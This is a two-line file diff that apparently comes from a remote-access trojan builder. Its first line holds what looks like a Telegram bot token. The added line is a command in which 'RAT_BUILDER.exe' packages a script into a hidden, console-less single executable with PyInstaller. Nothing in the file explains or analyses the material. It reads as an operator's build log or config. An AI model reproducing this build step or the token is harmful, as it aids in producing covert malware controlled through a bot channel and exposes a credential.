@@ -1,1 +1,2 @@
 8941624989:AAHZw_P4RXk83alNXcqsznmiExrDToW8F7w
+$ C:\Users\User\AppData\Local\Temp\Rar$EXa6680.10748.rartemp\RAT_BUILDER.exe -m PyInstaller --onefile --noconsole --clean --noconfirm --name build C:\Users\User\AppData\Local\Temp\ratbuild_kh8323jo\build.py
